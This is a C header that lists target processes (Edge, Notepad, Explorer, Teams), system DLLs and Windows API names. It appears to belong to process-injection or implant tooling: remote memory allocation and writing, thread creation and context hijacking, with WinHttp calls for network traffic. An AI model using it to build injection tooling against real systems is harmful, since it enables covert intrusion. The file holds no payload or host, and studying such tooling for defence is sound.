#pragma once

typedef struct _WSTRBUF {
    PWSTR  String;
    SIZE_T Length;
    PSTR   Name;
} WSTRBUF, *PWSTRBUF;

#define INIT_WSTRBUF( ModuleNameExt, MODULENAME ) { \
    .String = ModuleNameExt,                        \
    .Length = sizeof( ModuleNameExt ),              \
    .Name   = MODULENAME                            \
} 

WSTRBUF g_ExeArray[] = {
    INIT_WSTRBUF( L"msedge.exe",   "MSEDGE"   ),
    INIT_WSTRBUF( L"Notepad.exe",  "NOTEPAD"  ),
    INIT_WSTRBUF( L"explorer.exe", "EXPLORER" ),
    INIT_WSTRBUF( L"teams.exe",    "TEAMS"    ),
    
    { NULL }
};

WSTRBUF g_DllArray[] = {
    INIT_WSTRBUF( L"ntdll.dll",    "NTDLL"    ),
    INIT_WSTRBUF( L"win32u.dll",   "WIN32U"   ),
    INIT_WSTRBUF( L"kernel32.dll", "KERNEL32" ),
    INIT_WSTRBUF( L"winhttp.dll",  "WINHTTP"  ),

    { NULL }
};

CONST CHAR* g_FunctionNameStringsArray[] = {

    /* NTDLL */
    "TppWorkerThread",
    "NtWaitForWorkViaWorkerFactory",
    /* Win32u */
    "NtUserMessageCall",

    /* NTDLL -> Module and Function Loading */
    "LdrLoadDll",
    "LdrGetProcedureAddress",

    /* NTDLL -> Heap Functions */
    "RtlAllocateHeap",
    "RtlReAllocateHeap",
    "RtlFreeHeap",

    /* NTDLL->Syscall Stubs */
    "NtQuerySystemInformation",
    "NtOpenProcess",
    "NtAllocateVirtualMemory",
    "NtWriteVirtualMemory",
    "NtProtectVirtualMemory",
    "NtCreateThreadEx",
    "NtGetContextThread",
    "NtSetContextThread",
    "NtResumeThread",
    "NtWaitForSingleObject",
    "NtTerminateThread",
    "NtTerminateProcess",
    "NtClose",

    /* Kernel32 */
    "CreateThread",
    "Sleep",

    /* WinHttp */
    "WinHttpOpen",
    "WinHttpConnect",
    "WinHttpOpenRequest",
    "WinHttpSetOption",
    "WinHttpSendRequest",
    "WinHttpReceiveResponse",
    "WinHttpQueryHeaders",
    "WinHttpReadData",
    "WinHttpCloseHandle",

    NULL
};